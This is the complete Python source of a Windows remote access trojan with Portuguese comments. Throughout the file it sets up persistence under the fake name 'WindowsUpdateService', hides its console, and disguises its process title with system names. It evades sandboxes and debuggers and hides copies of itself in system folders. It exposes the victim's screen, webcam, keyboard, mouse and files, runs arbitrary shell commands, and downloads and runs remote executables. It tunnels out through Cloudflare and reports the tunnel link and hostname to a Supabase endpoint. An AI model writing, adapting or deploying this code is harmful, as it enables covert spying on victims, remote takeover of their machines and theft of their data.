# servidor_turbo.py - Versão ULTRARRÁPIDA com MODO OCULTO
import os
import sys
import time
import socket
import threading
import subprocess
import requests
import cv2
import numpy as np
from PIL import ImageGrab
import urllib.parse
import random
import pyautogui
import keyboard
import mouse
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import io
import traceback
from concurrent.futures import ThreadPoolExecutor
import queue
import winreg
import ctypes
import getpass
import platform

# ===== CONFIGURAÇÕES TURBO =====
SUPABASE_FUNCTION = "https://rhrjfvgfoqkumpdzevyn.supabase.co/functions/v1/add-link"
QUALIDADE_WEB = 50  # Qualidade JPEG (menor = mais rápido)
FPS_MAXIMO = 60     # FPS alvo
THREADS = 4         # Threads para processamento paralelo
MODO_OCULTO = True  # Ativar modo stealth
# ================================

# ===== FUNÇÕES DE PERSISTÊNCIA =====
def is_admin():
    """Verifica se está rodando como administrador"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    """Adiciona ao startup do Windows (vários métodos)"""
    try:
        # Método 1: Registry (Current User)
        chave = winreg.HKEY_CURRENT_USER
        caminho = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(chave, caminho, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, 
                            f'"{sys.executable}" "{os.path.abspath(__file__)}" --quiet')
        
        # Método 2: Startup Folder
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')
        bat_path = os.path.join(startup_folder, 'windows_update.bat')
        
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\nstart /b "" "{sys.executable}" "{os.path.abspath(__file__)}" --quiet\n')
        
        # Método 3: Task Scheduler (se admin)
        if is_admin():
            comando = f'schtasks /create /tn "WindowsUpdateTask" /tr "{sys.executable} {os.path.abspath(__file__)} --quiet" /sc onlogon /ru SYSTEM /f'
            subprocess.run(comando, shell=True, capture_output=True)
        
        return True
    except Exception as e:
        return False

def hide_console():
    """Esconde a janela do console"""
    try:
        if os.name == 'nt':
            # Esconde completamente
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
            # Ou roda como processo em background sem janela
            if hasattr(sys, 'frozen'):
                import win32gui
                import win32con
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
    except:
        pass

def rename_process():
    """Renomeia o processo para parecer legítimo"""
    try:
        if os.name == 'nt':
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            # Nomes legítimos comuns
            nomes_validos = [
                'svchost.exe',
                'dllhost.exe',
                'taskhostw.exe',
                'conhost.exe',
                'rundll32.exe',
                'lsass.exe',
                'winlogon.exe',
                'csrss.exe',
                'spoolsv.exe',
                'services.exe'
            ]
            
            novo_nome = random.choice(nomes_validos)
            kernel32.SetConsoleTitleW(novo_nome)
    except:
        pass

def check_sandbox():
    """Detecta se está em ambiente de análise"""
    try:
        # Verifica ferramentas de análise comuns
        processos_suspeitos = [
            'procmon.exe', 'wireshark.exe', 'fiddler.exe',
            'processhacker.exe', 'x64dbg.exe', 'ollydbg.exe',
            'ida.exe', 'ghidra.exe', 'vmtoolsd.exe', 'vboxservice.exe'
        ]
        
        import psutil
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() in processos_suspeitos:
                return True
        
        # Verifica tamanho do disco (máquinas virtuais geralmente têm discos pequenos)
        import shutil
        total, used, free = shutil.disk_usage("/")
        if total < 60 * 1024 * 1024 * 1024:  # Menos de 60GB
            return True
        
        return False
    except:
        return False

def criar_copia_oculta():
    """Cria cópia oculta em local do sistema"""
    try:
        # Locais do sistema para esconder
        locais = [
            os.path.join(os.environ['TEMP'], 'winupdate.py'),
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Caches', 'svchost.py'),
            os.path.join(os.environ['WINDIR'], 'System32', 'tasks', 'msupdate.py'),
            os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Caches', 'dllhost.py')
        ]
        
        # Cria diretórios se não existirem
        for local in locais:
            diretorio = os.path.dirname(local)
            if not os.path.exists(diretorio):
                os.makedirs(diretorio, exist_ok=True)
        
        # Copia para um local aleatório
        destino = random.choice(locais)
        
        # Se não for o mesmo arquivo, copia
        if os.path.abspath(__file__) != destino:
            import shutil
            shutil.copy2(__file__, destino)
            
            # Esconde o arquivo
            if os.name == 'nt':
                ctypes.windll.kernel32.SetFileAttributesW(destino, 2)  # FILE_ATTRIBUTE_HIDDEN
            
            return destino
        return __file__
    except:
        return __file__

# ===== HANDLER PRINCIPAL =====
class TurboHandler(BaseHTTPRequestHandler):
    """Handler com velocidade MÁXIMA"""
    
    def __init__(self, *args, **kwargs):
        self.camera = None
        self.camera_ativa = False
        self.ultimo_frame = None
        self.frame_cache = None
        self.tempo_ultimo_frame = 0
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        return  # Silencia logs
    
    def do_GET(self):
        try:
            if self.path == '/screenshot':
                self.enviar_screenshot_turbo()
            elif self.path == '/webcam':
                self.enviar_webcam_turbo()
            elif self.path == '/webcam/iniciar':
                self.iniciar_webcam_turbo()
            elif self.path == '/webcam/parar':
                self.parar_webcam()
            elif self.path == '/webcam/listar':
                self.listar_cameras()
            elif self.path == '/webcam/testar':
                self.testar_webcam()
            elif self.path == '/posicao_mouse':
                self.get_posicao_mouse()
            elif self.path == '/resolucao_tela':
                self.get_resolucao_tela()
            elif self.path == '/ping':
                self.enviar_ping()
            elif self.path == '/info':
                self.get_system_info()
            elif self.path == '/processos':
                self.listar_processos()
            elif self.path == '/download':
                self.baixar_arquivo()
            else:
                self.send_error(404)
        except Exception as e:
            pass
    
    def do_POST(self):
        """Recebe comandos em ultra velocidade"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length)
                comando = json.loads(post_data.decode())
            else:
                comando = {}
            
            # Processa comando em thread separada para não travar
            threading.Thread(target=self.processar_comando, args=(comando,), daemon=True).start()
            
            # Responde imediatamente
            self.enviar_resposta({"status": "ok"})
                
        except Exception as e:
            self.enviar_resposta({"erro": str(e)}, 500)
    
    def processar_comando(self, comando):
        """Processa comandos em background"""
        try:
            tipo = comando.get('tipo')
            
            if tipo == 'click':
                pyautogui.click(button=comando.get('botao', 'left'))
            elif tipo == 'double_click':
                pyautogui.doubleClick()
            elif tipo == 'right_click':
                pyautogui.rightClick()
            elif tipo == 'move_mouse':
                pyautogui.moveTo(comando.get('x', 0), comando.get('y', 0))
            elif tipo == 'scroll':
                pyautogui.scroll(comando.get('quantidade', 1))
            elif tipo == 'drag':
                pyautogui.dragTo(comando.get('x', 0), comando.get('y', 0))
            elif tipo == 'tecla':
                pyautogui.press(comando.get('tecla', ''))
            elif tipo == 'escrever':
                pyautogui.write(comando.get('texto', ''), interval=0.001)
            elif tipo == 'hotkey':
                pyautogui.hotkey(*comando.get('teclas', []))
            elif tipo == 'segurar_tecla':
                pyautogui.keyDown(comando.get('tecla', ''))
            elif tipo == 'soltar_tecla':
                pyautogui.keyUp(comando.get('tecla', ''))
            elif tipo == 'webcam_trocar':
                self.trocar_webcam(comando.get('indice', 0))
            elif tipo == 'executar_comando':
                resultado = subprocess.run(comando.get('cmd', ''), 
                                         shell=True, capture_output=True, text=True)
                print(f"Comando executado: {resultado.stdout}")
            elif tipo == 'baixar_executar':
                url = comando.get('url')
                if url:
                    r = requests.get(url, timeout=30)
                    nome_temp = os.path.join(os.environ['TEMP'], f"temp_{random.randint(1000,9999)}.exe")
                    with open(nome_temp, 'wb') as f:
                        f.write(r.content)
                    subprocess.Popen([nome_temp], shell=True)
                
        except Exception as e:
            print(f"Erro comando: {e}")
    
    def get_system_info(self):
        """Coleta informações do sistema"""
        info = {
            "hostname": socket.gethostname(),
            "usuario": getpass.getuser(),
            "so": platform.platform(),
            "processador": platform.processor(),
            "ip_publico": None,
            "admin": is_admin()
        }
        
        # Tenta obter IP público
        try:
            r = requests.get('https://api.ipify.org', timeout=5)
            info['ip_publico'] = r.text
        except:
            pass
        
        self.enviar_resposta(info)
    
    def listar_processos(self):
        """Lista processos em execução"""
        try:
            import psutil
            processos = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processos.append(proc.info)
                except:
                    pass
            self.enviar_resposta({"processos": processos[:50]})  # Limita a 50
        except:
            self.enviar_resposta({"erro": "psutil não instalado"})
    
    def baixar_arquivo(self):
        """Endpoint para baixar arquivos da vítima"""
        try:
            from urllib.parse import parse_qs, urlparse
            params = parse_qs(urlparse(self.path).query)
            arquivo = params.get('arquivo', [''])[0]
            
            if arquivo and os.path.exists(arquivo):
                with open(arquivo, 'rb') as f:
                    conteudo = f.read()
                
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(arquivo)}"')
                self.send_header('Content-Length', str(len(conteudo)))
                self.end_headers()
                self.wfile.write(conteudo)
            else:
                self.send_error(404)
        except:
            self.send_error(500)
    
    def enviar_screenshot_turbo(self):
        """Captura e envia tela em velocidade máxima"""
        try:
            inicio = time.time()
            
            # Captura tela
            img = ImageGrab.grab()
            img_np = np.array(img)
            
            # Reduz resolução para velocidade
            h, w = img_np.shape[:2]
            if w > 1280:
                scale = 1280 / w
                new_w = 1280
                new_h = int(h * scale)
                img_np = cv2.resize(img_np, (new_w, new_h))
            
            # Converte para JPEG
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), QUALIDADE_WEB]
            _, buffer = cv2.imencode('.jpg', img_np, encode_param)
            
            # Prepara headers
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('X-Process-Time', f'{time.time()-inicio:.3f}')
            self.send_header('Content-Length', str(len(buffer)))
            self.end_headers()
            
            # Envia
            self.wfile.write(buffer.tobytes())
            self.wfile.flush()
            
        except Exception:
            pass
    
    def enviar_webcam_turbo(self):
        """Webcam em velocidade MÁXIMA"""
        try:
            agora = time.time()
            if self.frame_cache and (agora - self.tempo_ultimo_frame) < 0.016:
                buffer = self.frame_cache
            else:
                if not self.camera_ativa:
                    self.iniciar_webcam_turbo()
                    if not self.camera_ativa:
                        self.send_error(404)
                        return
                
                ret, frame = self.camera.read()
                if not ret or frame is None:
                    self.send_error(500)
                    return
                
                frame = cv2.resize(frame, (426, 240))
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), QUALIDADE_WEB]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                
                self.frame_cache = buffer.tobytes()
                self.tempo_ultimo_frame = agora
            
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Content-Length', str(len(self.frame_cache)))
            self.end_headers()
            
            self.wfile.write(self.frame_cache)
            self.wfile.flush()
            
        except Exception:
            self.send_error(500)
    
    def iniciar_webcam_turbo(self):
        """Inicia webcam"""
        try:
            camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            
            if not camera.isOpened():
                camera = cv2.VideoCapture(0)
            
            if camera.isOpened():
                camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                camera.set(cv2.CAP_PROP_FPS, FPS_MAXIMO)
                camera.set(cv2.CAP_PROP_BUFFERSIZE, 1)
                camera.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc('M', 'J', 'P', 'G'))
                
                self.camera = camera
                self.camera_ativa = True
                
                for _ in range(5):
                    camera.read()
                
                self.send_response(200)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
                
        except Exception:
            self.send_response(500)
            self.end_headers()
    
    def parar_webcam(self):
        if self.camera:
            self.camera.release()
        self.camera = None
        self.camera_ativa = False
        self.send_response(200)
        self.end_headers()
    
    def listar_cameras(self):
        cameras = []
        for i in range(5):
            try:
                cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
                if cap.isOpened():
                    cameras.append({"indice": i, "nome": f"Câmera {i}"})
                    cap.release()
            except:
                continue
        self.enviar_resposta({"cameras": cameras})
    
    def testar_webcam(self):
        try:
            if not self.camera_ativa:
                self.iniciar_webcam_turbo()
                time.sleep(0.5)
            
            frames = []
            inicio = time.time()
            for _ in range(30):
                ret, frame = self.camera.read()
                if ret:
                    frames.append(frame)
            tempo = time.time() - inicio
            fps = len(frames) / tempo if tempo > 0 else 0
            
            info = {
                "status": "ok",
                "fps_real": round(fps, 1),
                "frames_capturados": len(frames),
                "tempo_teste": round(tempo, 3),
                "resolucao": f"{frame.shape[1]}x{frame.shape[0]}" if frames else "N/A"
            }
            self.enviar_resposta(info)
            
        except Exception as e:
            self.enviar_resposta({"erro": str(e)}, 500)
    
    def trocar_webcam(self, indice):
        if self.camera:
            self.camera.release()
        self.camera = cv2.VideoCapture(indice, cv2.CAP_DSHOW)
        self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        self.camera_ativa = self.camera.isOpened()
    
    def get_posicao_mouse(self):
        x, y = pyautogui.position()
        self.enviar_resposta({"x": x, "y": y})
    
    def get_resolucao_tela(self):
        w, h = pyautogui.size()
        self.enviar_resposta({"largura": w, "altura": h})
    
    def enviar_ping(self):
        self.enviar_resposta({"pong": time.time()})
    
    def enviar_resposta(self, dados, status=200):
        try:
            body = json.dumps(dados).encode()
            self.send_response(status)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            self.wfile.flush()
        except:
            pass
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

# ===== FUNÇÕES DO TÚNEL =====
def instalar_cloudflared():
    if os.path.exists('cloudflared.exe'):
        return 'cloudflared.exe'
    
    try:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        r = requests.get(url, timeout=30)
        with open('cloudflared.exe', 'wb') as f:
            f.write(r.content)
        return 'cloudflared.exe'
    except:
        return None

def criar_tunel(porta):
    cloudflared = instalar_cloudflared()
    if not cloudflared:
        return None
    
    # Roda escondido
    startupinfo = None
    if os.name == 'nt':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
    
    proc = subprocess.Popen(
        [cloudflared, 'tunnel', '--url', f'http://localhost:{porta}'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        startupinfo=startupinfo
    )
    
    url = None
    for _ in range(60):
        line = proc.stderr.readline()
        if 'trycloudflare.com' in line:
            import re
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                break
        time.sleep(0.5)
    
    return url

def enviar_para_supabase(tunnel_url):
    try:
        pc_name = socket.gethostname()
        link_cod = urllib.parse.quote(tunnel_url)
        nome_cod = urllib.parse.quote(pc_name)
        url = f"{SUPABASE_FUNCTION}?link={link_cod}&title={nome_cod}"
        
        requests.get(url, timeout=10)
        return True
    except Exception:
        return False

# ===== MAIN =====
def main():
    # Verifica sandbox (se detectar, para execução)
    if check_sandbox():
        sys.exit(0)
    
    # Modo oculto
    if MODO_OCULTO:
        hide_console()
        rename_process()
        
        # Copia para local escondido
        novo_local = criar_copia_oculta()
        
        # Adiciona persistência
        add_to_startup()
        
        # Se estiver rodando de local temporário, executa a cópia e sai
        if novo_local != __file__ and 'TEMP' in novo_local:
            subprocess.Popen([sys.executable, novo_local, '--quiet'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
    
    # Verifica argumento --quiet para não mostrar mensagens
    quiet_mode = '--quiet' in sys.argv
    
    if not quiet_mode:
        print("=" * 60)
        print("🚀 SERVIDOR TURBO VELOCIDADE v7.0 [MODO OCULTO]")
        print("=" * 60)
        print(f"⚡ Qualidade: {QUALIDADE_WEB}")
        print(f"⚡ FPS Máx: {FPS_MAXIMO}")
        print(f"⚡ Threads: {THREADS}")
        print("=" * 60)
    
    porta = random.randint(20000, 60000)
    
    # Inicia servidor HTTP
    http_server = HTTPServer(('0.0.0.0', porta), TurboHandler)
    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
    http_thread.start()
    
    # Cria túnel
    tunnel_url = criar_tunel(porta)
    
    if tunnel_url:
        if not quiet_mode:
            print(f"\n🔗 LINK DO TÚNEL: {tunnel_url}")
        
        # Envia para Supabase
        enviar_para_supabase(tunnel_url)
        
        if not quiet_mode:
            print("✅ Servidor TURBO pronto em modo OCULTO")
            print("⚡ Pressione Ctrl+C para parar")
    else:
        if not quiet_mode:
            print("❌ Falha no túnel")
        return
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        http_server.shutdown()

if __name__ == "__main__":
    # Processa argumentos
    if '--uninstall' in sys.argv:
        # Remove do startup
        try:
            chave = winreg.HKEY_CURRENT_USER
            caminho = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(chave, caminho, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "WindowsUpdateService")
        except:
            pass
        sys.exit(0)
    
    main()
